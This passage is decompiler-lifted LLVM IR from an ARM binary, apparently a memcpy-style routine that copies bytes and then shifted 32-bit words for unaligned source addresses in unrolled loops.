  %v7_17f28 = load i8, i8* %v6_17f28, align 1
  %v8_17f28 = zext i8 %v7_17f28 to i32
  store i32 %v8_17f28, i32* %r3.global-to-local, align 4
  %v10_17f28 = add i32 %v5_17f28, 1
  store i32 %v10_17f28, i32* @r1, align 4
  %v8_17f2c = inttoptr i32 %v7_17f2c to i8*
  store i8 %v7_17f28, i8* %v8_17f2c, align 1
  %v9_17f2c = load i32, i32* %r0.global-to-local, align 4
  %v10_17f2c = add i32 %v9_17f2c, 1
  store i32 %v10_17f2c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_17f30 = load i8*, i8** %stack_var_-8, align 4
  %v3_17f30 = ptrtoint i8* %v2_17f30 to i32
  store i32 %v3_17f30, i32* %r0.global-to-local, align 4
  ret i32 %v3_17f30

dec_label_pc_17f34:                               ; preds = %dec_label_pc_17e88
  %v1_17f34 = sub nsw i32 4, %v1_17e88
  store i32 %v1_17f34, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_17f38 = icmp ult i32 %v1_17f34, 2
  store i1 %v8_17f38, i1* %cpsr_n.global-to-local, align 1
  %v1_17f3c = inttoptr i32 %v0_17e70 to i8*
  %v2_17f3c = load i8, i8* %v1_17f3c, align 1
  %v3_17f3c = zext i8 %v2_17f3c to i32
  store i32 %v3_17f3c, i32* %r3.global-to-local, align 4
  %v5_17f3c = add i32 %v0_17e70, 1
  store i32 %v5_17f3c, i32* @r1, align 4
  store i8 %v2_17f3c, i8* %v5_17e7c, align 1
  %v4_17f40 = load i32, i32* %r0.global-to-local, align 4
  %v5_17f40 = add i32 %v4_17f40, 1
  store i32 %v5_17f40, i32* %r0.global-to-local, align 4
  br i1 %v8_17f38, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_17f34
  %v9_17f38 = icmp eq i32 %v1_17f34, 2
  %v6_17f44 = load i32, i32* @r1, align 4
  %v7_17f44 = inttoptr i32 %v6_17f44 to i8*
  %v8_17f44 = load i8, i8* %v7_17f44, align 1
  %v9_17f44 = zext i8 %v8_17f44 to i32
  store i32 %v9_17f44, i32* %r3.global-to-local, align 4
  %v11_17f44 = add i32 %v6_17f44, 1
  store i32 %v11_17f44, i32* @r1, align 4
  %v9_17f48 = inttoptr i32 %v5_17f40 to i8*
  store i8 %v8_17f44, i8* %v9_17f48, align 1
  %v10_17f48 = load i32, i32* %r0.global-to-local, align 4
  %v11_17f48 = add i32 %v10_17f48, 1
  store i32 %v11_17f48, i32* %r0.global-to-local, align 4
  br i1 %v9_17f38, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_17f4c = load i32, i32* @r1, align 4
  %v9_17f4c = inttoptr i32 %v8_17f4c to i8*
  %v10_17f4c = load i8, i8* %v9_17f4c, align 1
  %v11_17f4c = zext i8 %v10_17f4c to i32
  store i32 %v11_17f4c, i32* %r3.global-to-local, align 4
  %v13_17f4c = add i32 %v8_17f4c, 1
  store i32 %v13_17f4c, i32* @r1, align 4
  %v11_17f50 = inttoptr i32 %v11_17f48 to i8*
  store i8 %v10_17f4c, i8* %v11_17f50, align 1
  %v12_17f50 = load i32, i32* %r0.global-to-local, align 4
  %v13_17f50 = add i32 %v12_17f50, 1
  store i32 %v13_17f50, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_17f34, %bb139
  %v0_17fac76 = phi i32 [ %v11_17f48, %bb138 ], [ %v5_17f40, %dec_label_pc_17f34 ], [ %v13_17f50, %bb139 ]
  %v0_17f54 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f54 = load i32, i32* @ip, align 4
  %v2_17f54 = sub i32 %v0_17f54, %v1_17f54
  store i32 %v2_17f54, i32* %r2.global-to-local, align 4
  %v4_17f54 = xor i32 %v1_17f54, %v0_17f54
  %v5_17f54 = xor i32 %v2_17f54, %v0_17f54
  %v6_17f54 = and i32 %v5_17f54, %v4_17f54
  %v7_17f54 = icmp slt i32 %v6_17f54, 0
  store i1 %v7_17f54, i1* %cpsr_v.global-to-local, align 1
  %v8_17f54 = icmp slt i32 %v2_17f54, 0
  store i1 %v8_17f54, i1* %cpsr_n.global-to-local, align 1
  %v5_17f58 = icmp slt i32 %v0_17f54, %v1_17f54
  br i1 %v5_17f58, label %bb133, label %dec_label_pc_17f5c

dec_label_pc_17f5c:                               ; preds = %.thread12
  %v0_17f5c = load i32, i32* @r1, align 4
  %v1_17f5c = urem i32 %v0_17f5c, 4
  store i32 %v1_17f5c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17f5c = icmp eq i32 %v1_17f5c, 0
  %extract.t124 = trunc i32 %v0_17f5c to i2
  br i1 %v2_17f5c, label %dec_label_pc_17e98, label %dec_label_pc_17f64

dec_label_pc_17f64:                               ; preds = %dec_label_pc_17e90, %dec_label_pc_17f5c
  %v0_17fac75 = phi i32 [ %v1_17e70, %dec_label_pc_17e90 ], [ %v0_17fac76, %dec_label_pc_17f5c ]
  %v0_18058 = phi i32 [ %v2_17e80, %dec_label_pc_17e90 ], [ %v2_17f54, %dec_label_pc_17f5c ]
  %v0_17f6c.off0 = phi i2 [ %extract.t, %dec_label_pc_17e90 ], [ %extract.t124, %dec_label_pc_17f5c ]
  %v0_17f64 = phi i32 [ %v0_17e70, %dec_label_pc_17e90 ], [ %v0_17f5c, %dec_label_pc_17f5c ]
  %v1_17f64 = and i32 %v0_17f64, -4
  store i32 %v1_17f64, i32* %r1.global-to-local, align 4
  %v1_17f68 = inttoptr i32 %v1_17f64 to i32*
  %v2_17f68 = load i32, i32* %v1_17f68, align 4
  store i32 %v2_17f68, i32* @lr, align 4
  %v4_17f68 = add i32 %v1_17f64, 4
  store i32 %v4_17f68, i32* %r1.global-to-local, align 4
  %v2_18050 = add i32 %v0_18058, -12
  %v4_18050 = sub i32 11, %v0_18058
  %v5_18050 = and i32 %v4_18050, %v0_18058
  %v6_18050 = icmp slt i32 %v5_18050, 0
  store i1 %v6_18050, i1* %cpsr_v.global-to-local, align 1
  %v7_18050 = icmp slt i32 %v2_18050, 0
  store i1 %v7_18050, i1* %cpsr_n.global-to-local, align 1
  %v5_18054 = icmp slt i32 %v0_18058, 12
  switch i2 %v0_17f6c.off0, label %dec_label_pc_17f78 [
    i2 -1, label %dec_label_pc_18050
    i2 -2, label %dec_label_pc_17fe4
  ]

dec_label_pc_17f78:                               ; preds = %dec_label_pc_17f64
  br i1 %v5_18054, label %dec_label_pc_17fc4, label %dec_label_pc_17f80

dec_label_pc_17f80:                               ; preds = %dec_label_pc_17f78
  store i32 %v2_18050, i32* %r2.global-to-local, align 4
  %v3_17f84 = load i32, i32* @r4, align 4
  store i32 %v3_17f84, i32* %stack_var_-16, align 4
  %v6_17f84 = load i32, i32* @r5, align 4
  store i32 %v6_17f84, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17f88

dec_label_pc_17f88:                               ; preds = %dec_label_pc_17f88.dec_label_pc_17f88_crit_edge, %dec_label_pc_17f80
  %v0_17fac = phi i32 [ %v12_17fac, %dec_label_pc_17f88.dec_label_pc_17f88_crit_edge ], [ %v0_17fac75, %dec_label_pc_17f80 ]
  %v0_17f8c = phi i32 [ %v0_17f8c.pre, %dec_label_pc_17f88.dec_label_pc_17f88_crit_edge ], [ %v4_17f68, %dec_label_pc_17f80 ]
  %v0_17f88 = phi i32 [ %v0_17f88.pre, %dec_label_pc_17f88.dec_label_pc_17f88_crit_edge ], [ %v2_17f68, %dec_label_pc_17f80 ]
  %v3_17f88 = udiv i32 %v0_17f88, 256
  store i32 %v3_17f88, i32* %r3.global-to-local, align 4
  %v1_17f8c = inttoptr i32 %v0_17f8c to i32*
  %v2_17f8c = load i32, i32* %v1_17f8c, align 4
  store i32 %v2_17f8c, i32* %r4.global-to-local, align 4
  %v3_17f8c = add i32 %v0_17f8c, 4
  %v4_17f8c = inttoptr i32 %v3_17f8c to i32*
  %v5_17f8c = load i32, i32* %v4_17f8c, align 4
  store i32 %v5_17f8c, i32* %r5.global-to-local, align 4
  %v6_17f8c = add i32 %v0_17f8c, 8
  %v7_17f8c = inttoptr i32 %v6_17f8c to i32*
  %v8_17f8c = load i32, i32* %v7_17f8c, align 4
  store i32 %v8_17f8c, i32* %ip.global-to-local, align 4
  %v9_17f8c = add i32 %v0_17f8c, 12
  %v10_17f8c = inttoptr i32 %v9_17f8c to i32*
  %v11_17f8c = load i32, i32* %v10_17f8c, align 4
  store i32 %v11_17f8c, i32* @lr, align 4
  %v12_17f8c = add i32 %v0_17f8c, 16
  store i32 %v12_17f8c, i32* %r1.global-to-local, align 4
  %v4_17f90 = mul i32 %v2_17f8c, 16777216
  %v5_17f90 = or i32 %v4_17f90, %v3_17f88
  store i32 %v5_17f90, i32* %r3.global-to-local, align 4
  %v3_17f94 = udiv i32 %v2_17f8c, 256
  %v4_17f98 = mul i32 %v5_17f8c, 16777216
  %v5_17f98 = or i32 %v4_17f98, %v3_17f94
  store i32 %v5_17f98, i32* %r4.global-to-local, align 4
  %v3_17f9c = udiv i32 %v5_17f8c, 256
  %v4_17fa0 = mul i32 %v8_17f8c, 16777216
  %v5_17fa0 = or i32 %v4_17fa0, %v3_17f9c
  store i32 %v5_17fa0, i32* %r5.global-to-local, align 4
  %v3_17fa4 = udiv i32 %v8_17f8c, 256
  %v4_17fa8 = mul i32 %v11_17f8c, 16777216
  %v5_17fa8 = or i32 %v4_17fa8, %v3_17fa4
  store i32 %v5_17fa8, i32* @ip, align 4
  %v1_17fac = inttoptr i32 %v0_17fac to i32*
  store i32 %v5_17f90, i32* %v1_17fac, align 4
  %v3_17fac = add i32 %v0_17fac, 4
  %v4_17fac = inttoptr i32 %v3_17fac to i32*
  %v5_17fac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17fac, i32* %v4_17fac, align 4
  %v6_17fac = add i32 %v0_17fac, 8
  %v7_17fac = inttoptr i32 %v6_17fac to i32*
  %v8_17fac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17fac, i32* %v7_17fac, align 4
  %v9_17fac = add i32 %v0_17fac, 12
  %v10_17fac = inttoptr i32 %v9_17fac to i32*
  %v11_17fac = load i32, i32* @ip, align 4
  store i32 %v11_17fac, i32* %v10_17fac, align 4
  %v12_17fac = add i32 %v0_17fac, 16
  store i32 %v12_17fac, i32* %r0.global-to-local, align 4
  %v0_17fb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_17fb0 = add i32 %v0_17fb0, -16
  store i32 %v2_17fb0, i32* %r2.global-to-local, align 4
  %v6_17fb4 = icmp slt i32 %v0_17fb0, 16
  br i1 %v6_17fb4, label %dec_label_pc_17fb8, label %dec_label_pc_17f88.dec_label_pc_17f88_crit_edge

dec_label_pc_17f88.dec_label_pc_17f88_crit_edge:  ; preds = %dec_label_pc_17f88
  %v0_17f88.pre = load i32, i32* @lr, align 4
  %v0_17f8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17f88

dec_label_pc_17fb8:                               ; preds = %dec_label_pc_17f88
  %v2_17fb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17fb8, i32* @r4, align 4
  %v5_17fb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17fb8, i32* @r5, align 4
  %v2_17fbc = add i32 %v0_17fb0, -4
  store i32 %v2_17fbc, i32* %r2.global-to-local, align 4
  %v4_17fbc = add i32 %v0_17fb0, 2147483632
  %v5_17fbc = and i32 %v2_17fbc, %v4_17fbc
  %v6_17fbc = icmp slt i32 %v5_17fbc, 0
  store i1 %v6_17fbc, i1* %cpsr_v.global-to-local, align 1
  %v7_17fbc = icmp slt i32 %v2_17fbc, 0
  store i1 %v7_17fbc, i1* %cpsr_n.global-to-local, align 1
  %v5_17fc0 = icmp slt i32 %v2_17fb0, -12
  br i1 %v5_17fc0, label %dec_label_pc_17fdc, label %dec_label_pc_17fc4

dec_label_pc_17fc4:                               ; preds = %dec_label_pc_17fb8, %dec_label_pc_17f78, %dec_label_pc_17fc4
  %v1_17fd0 = phi i32 [ %v4_17fd0, %dec_label_pc_17fc4 ], [ %v12_17fac, %dec_label_pc_17fb8 ], [ %v0_17fac75, %dec_label_pc_17f78 ]
  %v0_17fc4 = load i32, i32* @lr, align 4
  %v3_17fc4 = udiv i32 %v0_17fc4, 256
  store i32 %v3_17fc4, i32* %ip.global-to-local, align 4
  %v0_17fc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17fc8 = inttoptr i32 %v0_17fc8 to i32*
  %v2_17fc8 = load i32, i32* %v1_17fc8, align 4
  store i32 %v2_17fc8, i32* @lr, align 4
  %v4_17fc8 = add i32 %v0_17fc8, 4
  store i32 %v4_17fc8, i32* %r1.global-to-local, align 4
  %v4_17fcc = mul i32 %v2_17fc8, 16777216
  %v5_17fcc = or i32 %v4_17fcc, %v3_17fc4
  store i32 %v5_17fcc, i32* @ip, align 4
  %v2_17fd0 = inttoptr i32 %v1_17fd0 to i32*
  store i32 %v5_17fcc, i32* %v2_17fd0, align 4
  %v3_17fd0 = load i32, i32* %r0.global-to-local, align 4
  %v4_17fd0 = add i32 %v3_17fd0, 4
  store i32 %v4_17fd0, i32* %r0.global-to-local, align 4
  %v0_17fd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_17fd4 = add i32 %v0_17fd4, -4
  store i32 %v2_17fd4, i32* %r2.global-to-local, align 4
  %v6_17fd8 = icmp slt i32 %v0_17fd4, 4
  br i1 %v6_17fd8, label %dec_label_pc_17fdc.loopexit, label %dec_label_pc_17fc4

dec_label_pc_17fdc.loopexit:                      ; preds = %dec_label_pc_17fc4
  %v4_17fd4 = sub i32 3, %v0_17fd4
  %v5_17fd4 = and i32 %v4_17fd4, %v0_17fd4
  %v6_17fd4 = icmp slt i32 %v5_17fd4, 0
  %v7_17fd4 = icmp slt i32 %v2_17fd4, 0
  store i1 %v6_17fd4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17fd4, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17fdc

dec_label_pc_17fdc:                               ; preds = %dec_label_pc_17fdc.loopexit, %dec_label_pc_17fb8
  %v2_17f1c113 = phi i32 [ %v4_17fd0, %dec_label_pc_17fdc.loopexit ], [ %v12_17fac, %dec_label_pc_17fb8 ]
  %v0_17f0c109 = phi i32 [ %v2_17fd4, %dec_label_pc_17fdc.loopexit ], [ %v2_17fbc, %dec_label_pc_17fb8 ]
  %v0_17fdc = load i32, i32* %r1.global-to-local, align 4
  %v1_17fdc = add i32 %v0_17fdc, -3
  store i32 %v1_17fdc, i32* @r1, align 4
  br label %bb133

dec_label_pc_17fe4:                               ; preds = %dec_label_pc_17f64
  br i1 %v5_18054, label %dec_label_pc_18030, label %dec_label_pc_17fec

dec_label_pc_17fec:                               ; preds = %dec_label_pc_17fe4
  store i32 %v2_18050, i32* %r2.global-to-local, align 4
  %v3_17ff0 = load i32, i32* @r4, align 4
  store i32 %v3_17ff0, i32* %stack_var_-16, align 4
  %v6_17ff0 = load i32, i32* @r5, align 4
  store i32 %v6_17ff0, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17ff4

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17ff4.dec_label_pc_17ff4_crit_edge, %dec_label_pc_17fec
  %v0_18018 = phi i32 [ %v12_18018, %dec_label_pc_17ff4.dec_label_pc_17ff4_crit_edge ], [ %v0_17fac75, %dec_label_pc_17fec ]
  %v0_17ff8 = phi i32 [ %v0_17ff8.pre, %dec_label_pc_17ff4.dec_label_pc_17ff4_crit_edge ], [ %v4_17f68, %dec_label_pc_17fec ]
  %v0_17ff4 = phi i32 [ %v0_17ff4.pre, %dec_label_pc_17ff4.dec_label_pc_17ff4_crit_edge ], [ %v2_17f68, %dec_label_pc_17fec ]
  %v3_17ff4 = udiv i32 %v0_17ff4, 65536
  store i32 %v3_17ff4, i32* %r3.global-to-local, align 4
  %v1_17ff8 = inttoptr i32 %v0_17ff8 to i32*
  %v2_17ff8 = load i32, i32* %v1_17ff8, align 4
  store i32 %v2_17ff8, i32* %r4.global-to-local, align 4
  %v3_17ff8 = add i32 %v0_17ff8, 4
  %v4_17ff8 = inttoptr i32 %v3_17ff8 to i32*
  %v5_17ff8 = load i32, i32* %v4_17ff8, align 4
  store i32 %v5_17ff8, i32* %r5.global-to-local, align 4
  %v6_17ff8 = add i32 %v0_17ff8, 8
  %v7_17ff8 = inttoptr i32 %v6_17ff8 to i32*
  %v8_17ff8 = load i32, i32* %v7_17ff8, align 4
  store i32 %v8_17ff8, i32* %ip.global-to-local, align 4
  %v9_17ff8 = add i32 %v0_17ff8, 12
  %v10_17ff8 = inttoptr i32 %v9_17ff8 to i32*
  %v11_17ff8 = load i32, i32* %v10_17ff8, align 4
  store i32 %v11_17ff8, i32* @lr, align 4
  %v12_17ff8 = add i32 %v0_17ff8, 16
  store i32 %v12_17ff8, i32* %r1.global-to-local, align 4
  %v4_17ffc = mul i32 %v2_17ff8, 65536
  %v5_17ffc = or i32 %v4_17ffc, %v3_17ff4
  store i32 %v5_17ffc, i32* %r3.global-to-local, align 4
  %v3_18000 = udiv i32 %v2_17ff8, 65536
  %v4_18004 = mul i32 %v5_17ff8, 65536
  %v5_18004 = or i32 %v4_18004, %v3_18000
  store i32 %v5_18004, i32* %r4.global-to-local, align 4
  %v3_18008 = udiv i32 %v5_17ff8, 65536
  %v4_1800c = mul i32 %v8_17ff8, 65536
  %v5_1800c = or i32 %v4_1800c, %v3_18008
  store i32 %v5_1800c, i32* %r5.global-to-local, align 4
  %v3_18010 = udiv i32 %v8_17ff8, 65536
  %v4_18014 = mul i32 %v11_17ff8, 65536
  %v5_18014 = or i32 %v4_18014, %v3_18010
  store i32 %v5_18014, i32* @ip, align 4
  %v1_18018 = inttoptr i32 %v0_18018 to i32*
  store i32 %v5_17ffc, i32* %v1_18018, align 4
  %v3_18018 = add i32 %v0_18018, 4
  %v4_18018 = inttoptr i32 %v3_18018 to i32*
  %v5_18018 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18018, i32* %v4_18018, align 4
  %v6_18018 = add i32 %v0_18018, 8
  %v7_18018 = inttoptr i32 %v6_18018 to i32*
  %v8_18018 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18018, i32* %v7_18018, align 4
  %v9_18018 = add i32 %v0_18018, 12
  %v10_18018 = inttoptr i32 %v9_18018 to i32*
  %v11_18018 = load i32, i32* @ip, align 4
  store i32 %v11_18018, i32* %v10_18018, align 4
  %v12_18018 = add i32 %v0_18018, 16
  store i32 %v12_18018, i32* %r0.global-to-local, align 4
  %v0_1801c = load i32, i32* %r2.global-to-local, align 4
  %v2_1801c = add i32 %v0_1801c, -16
  store i32 %v2_1801c, i32* %r2.global-to-local, align 4
  %v6_18020 = icmp slt i32 %v0_1801c, 16
  br i1 %v6_18020, label %dec_label_pc_18024, label %dec_label_pc_17ff4.dec_label_pc_17ff4_crit_edge

dec_label_pc_17ff4.dec_label_pc_17ff4_crit_edge:  ; preds = %dec_label_pc_17ff4
  %v0_17ff4.pre = load i32, i32* @lr, align 4
  %v0_17ff8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17ff4

dec_label_pc_18024:                               ; preds = %dec_label_pc_17ff4
  %v2_18024 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18024, i32* @r4, align 4
  %v5_18024 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18024, i32* @r5, align 4
  %v2_18028 = add i32 %v0_1801c, -4
  store i32 %v2_18028, i32* %r2.global-to-local, align 4
  %v4_18028 = add i32 %v0_1801c, 2147483632
  %v5_18028 = and i32 %v2_18028, %v4_18028
  %v6_18028 = icmp slt i32 %v5_18028, 0
  store i1 %v6_18028, i1* %cpsr_v.global-to-local, align 1
  %v7_18028 = icmp slt i32 %v2_18028, 0
  store i1 %v7_18028, i1* %cpsr_n.global-to-local, align 1
  %v5_1802c = icmp slt i32 %v2_1801c, -12
  br i1 %v5_1802c, label %dec_label_pc_18048, label %dec_label_pc_18030

dec_label_pc_18030:                               ; preds = %dec_label_pc_18024, %dec_label_pc_17fe4, %dec_label_pc_18030
  %v1_1803c = phi i32 [ %v4_1803c, %dec_label_pc_18030 ], [ %v12_18018, %dec_label_pc_18024 ], [ %v0_17fac75, %dec_label_pc_17fe4 ]
  %v0_18030 = load i32, i32* @lr, align 4
  %v3_18030 = udiv i32 %v0_18030, 65536
  store i32 %v3_18030, i32* %ip.global-to-local, align 4
  %v0_18034 = load i32, i32* %r1.global-to-local, align 4
  %v1_18034 = inttoptr i32 %v0_18034 to i32*
  %v2_18034 = load i32, i32* %v1_18034, align 4
  store i32 %v2_18034, i32* @lr, align 4
  %v4_18034 = add i32 %v0_18034, 4
  store i32 %v4_18034, i32* %r1.global-to-local, align 4
  %v4_18038 = mul i32 %v2_18034, 65536
  %v5_18038 = or i32 %v4_18038, %v3_18030
  store i32 %v5_18038, i32* @ip, align 4
  %v2_1803c = inttoptr i32 %v1_1803c to i32*
  store i32 %v5_18038, i32* %v2_1803c, align 4
  %v3_1803c = load i32, i32* %r0.global-to-local, align 4
  %v4_1803c = add i32 %v3_1803c, 4
  store i32 %v4_1803c, i32* %r0.global-to-local, align 4
  %v0_18040 = load i32, i32* %r2.global-to-local, align 4
  %v2_18040 = add i32 %v0_18040, -4
  store i32 %v2_18040, i32* %r2.global-to-local, align 4
  %v6_18044 = icmp slt i32 %v0_18040, 4
  br i1 %v6_18044, label %dec_label_pc_18048.loopexit, label %dec_label_pc_18030

dec_label_pc_18048.loopexit:                      ; preds = %dec_label_pc_18030
  %v4_18040 = sub i32 3, %v0_18040
  %v5_18040 = and i32 %v4_18040, %v0_18040
  %v6_18040 = icmp slt i32 %v5_18040, 0
  %v7_18040 = icmp slt i32 %v2_18040, 0
  store i1 %v6_18040, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18040, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18048

dec_label_pc_18048:                               ; preds = %dec_label_pc_18048.loopexit, %dec_label_pc_18024
  %v2_17f1c112 = phi i32 [ %v4_1803c, %dec_label_pc_18048.loopexit ], [ %v12_18018, %dec_label_pc_18024 ]
  %v0_17f0c108 = phi i32 [ %v2_18040, %dec_label_pc_18048.loopexit ], [ %v2_18028, %dec_label_pc_18024 ]
  %v0_18048 = load i32, i32* %r1.global-to-local, align 4
  %v1_18048 = add i32 %v0_18048, -2
  store i32 %v1_18048, i32* @r1, align 4
  br label %bb133

dec_label_pc_18050:                               ; preds = %dec_label_pc_17f64
  br i1 %v5_18054, label %dec_label_pc_1809c, label %dec_label_pc_18058

dec_label_pc_18058:                               ; preds = %dec_label_pc_18050
  store i32 %v2_18050, i32* %r2.global-to-local, align 4
  %v3_1805c = load i32, i32* @r4, align 4
  store i32 %v3_1805c, i32* %stack_var_-16, align 4
  %v6_1805c = load i32, i32* @r5, align 4
  store i32 %v6_1805c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18060

dec_label_pc_18060:                               ; preds = %dec_label_pc_18060.dec_label_pc_18060_crit_edge, %dec_label_pc_18058
  %v0_18084 = phi i32 [ %v12_18084, %dec_label_pc_18060.dec_label_pc_18060_crit_edge ], [ %v0_17fac75, %dec_label_pc_18058 ]
  %v0_18064 = phi i32 [ %v0_18064.pre, %dec_label_pc_18060.dec_label_pc_18060_crit_edge ], [ %v4_17f68, %dec_label_pc_18058 ]
  %v0_18060 = phi i32 [ %v0_18060.pre, %dec_label_pc_18060.dec_label_pc_18060_crit_edge ], [ %v2_17f68, %dec_label_pc_18058 ]
  %v3_18060 = udiv i32 %v0_18060, 16777216
  store i32 %v3_18060, i32* %r3.global-to-local, align 4
  %v1_18064 = inttoptr i32 %v0_18064 to i32*
  %v2_18064 = load i32, i32* %v1_18064, align 4
  store i32 %v2_18064, i32* %r4.global-to-local, align 4
  %v3_18064 = add i32 %v0_18064, 4
  %v4_18064 = inttoptr i32 %v3_18064 to i32*
  %v5_18064 = load i32, i32* %v4_18064, align 4
  store i32 %v5_18064, i32* %r5.global-to-local, align 4
  %v6_18064 = add i32 %v0_18064, 8
  %v7_18064 = inttoptr i32 %v6_18064 to i32*
  %v8_18064 = load i32, i32* %v7_18064, align 4
  store i32 %v8_18064, i32* %ip.global-to-local, align 4
  %v9_18064 = add i32 %v0_18064, 12
  %v10_18064 = inttoptr i32 %v9_18064 to i32*
  %v11_18064 = load i32, i32* %v10_18064, align 4
  store i32 %v11_18064, i32* @lr, align 4
  %v12_18064 = add i32 %v0_18064, 16
  store i32 %v12_18064, i32* %r1.global-to-local, align 4
  %v4_18068 = mul i32 %v2_18064, 256
  %v5_18068 = or i32 %v4_18068, %v3_18060
  store i32 %v5_18068, i32* %r3.global-to-local, align 4
  %v3_1806c = udiv i32 %v2_18064, 16777216
  %v4_18070 = mul i32 %v5_18064, 256
  %v5_18070 = or i32 %v4_18070, %v3_1806c
  store i32 %v5_18070, i32* %r4.global-to-local, align 4
  %v3_18074 = udiv i32 %v5_18064, 16777216
  %v4_18078 = mul i32 %v8_18064, 256
  %v5_18078 = or i32 %v4_18078, %v3_18074
  store i32 %v5_18078, i32* %r5.global-to-local, align 4
  %v3_1807c = udiv i32 %v8_18064, 16777216
  %v4_18080 = mul i32 %v11_18064, 256
  %v5_18080 = or i32 %v4_18080, %v3_1807c
  store i32 %v5_18080, i32* @ip, align 4
  %v1_18084 = inttoptr i32 %v0_18084 to i32*
  store i32 %v5_18068, i32* %v1_18084, align 4
  %v3_18084 = add i32 %v0_18084, 4
  %v4_18084 = inttoptr i32 %v3_18084 to i32*
  %v5_18084 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18084, i32* %v4_18084, align 4
  %v6_18084 = add i32 %v0_18084, 8
  %v7_18084 = inttoptr i32 %v6_18084 to i32*
  %v8_18084 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18084, i32* %v7_18084, align 4
  %v9_18084 = add i32 %v0_18084, 12
  %v10_18084 = inttoptr i32 %v9_18084 to i32*
  %v11_18084 = load i32, i32* @ip, align 4
  store i32 %v11_18084, i32* %v10_18084, align 4
  %v12_18084 = add i32 %v0_18084, 16
  store i32 %v12_18084, i32* %r0.global-to-local, align 4
  %v0_18088 = load i32, i32* %r2.global-to-local, align 4
  %v2_18088 = add i32 %v0_18088, -16
  store i32 %v2_18088, i32* %r2.global-to-local, align 4
  %v6_1808c = icmp slt i32 %v0_18088, 16
  br i1 %v6_1808c, label %dec_label_pc_18090, label %dec_label_pc_18060.dec_label_pc_18060_crit_edge

dec_label_pc_18060.dec_label_pc_18060_crit_edge:  ; preds = %dec_label_pc_18060
  %v0_18060.pre = load i32, i32* @lr, align 4
  %v0_18064.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18060

dec_label_pc_18090:                               ; preds = %dec_label_pc_18060
  %v2_18090 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18090, i32* @r4, align 4
  %v5_18090 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18090, i32* @r5, align 4
  %v2_18094 = add i32 %v0_18088, -4
  store i32 %v2_18094, i32* %r2.global-to-local, align 4
  %v4_18094 = add i32 %v0_18088, 2147483632
  %v5_18094 = and i32 %v2_18094, %v4_18094
  %v6_18094 = icmp slt i32 %v5_18094, 0
  store i1 %v6_18094, i1* %cpsr_v.global-to-local, align 1
  %v7_18094 = icmp slt i32 %v2_18094, 0
  store i1 %v7_18094, i1* %cpsr_n.global-to-local, align 1
  %v5_18098 = icmp slt i32 %v2_18088, -12
  br i1 %v5_18098, label %dec_label_pc_180b4, label %dec_label_pc_1809c

dec_label_pc_1809c:                               ; preds = %dec_label_pc_18090, %dec_label_pc_18050, %dec_label_pc_1809c
  %v1_180a8 = phi i32 [ %v4_180a8, %dec_label_pc_1809c ], [ %v12_18084, %dec_label_pc_18090 ], [ %v0_17fac75, %dec_label_pc_18050 ]
  %v0_1809c = load i32, i32* @lr, align 4
  %v3_1809c = udiv i32 %v0_1809c, 16777216
  store i32 %v3_1809c, i32* %ip.global-to-local, align 4
  %v0_180a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_180a0 = inttoptr i32 %v0_180a0 to i32*
  %v2_180a0 = load i32, i32* %v1_180a0, align 4
  store i32 %v2_180a0, i32* @lr, align 4
  %v4_180a0 = add i32 %v0_180a0, 4
  store i32 %v4_180a0, i32* %r1.global-to-local, align 4
  %v4_180a4 = mul i32 %v2_180a0, 256
  %v5_180a4 = or i32 %v4_180a4, %v3_1809c
  store i32 %v5_180a4, i32* @ip, align 4
  %v2_180a8 = inttoptr i32 %v1_180a8 to i32*
  store i32 %v5_180a4, i32* %v2_180a8, align 4
  %v3_180a8 = load i32, i32* %r0.global-to-local, align 4
  %v4_180a8 = add i32 %v3_180a8, 4
  store i32 %v4_180a8, i32* %r0.global-to-local, align 4
  %v0_180ac = load i32, i32* %r2.global-to-local, align 4
  %v2_180ac = add i32 %v0_180ac, -4
  store i32 %v2_180ac, i32* %r2.global-to-local, align 4
  %v6_180b0 = icmp slt i32 %v0_180ac, 4
  br i1 %v6_180b0, label %dec_label_pc_180b4.loopexit, label %dec_label_pc_1809c

dec_label_pc_180b4.loopexit:                      ; preds = %dec_label_pc_1809c
  %v4_180ac = sub i32 3, %v0_180ac
  %v5_180ac = and i32 %v4_180ac, %v0_180ac
  %v6_180ac = icmp slt i32 %v5_180ac, 0
  %v7_180ac = icmp slt i32 %v2_180ac, 0
  store i1 %v6_180ac, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_180ac, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_180b4

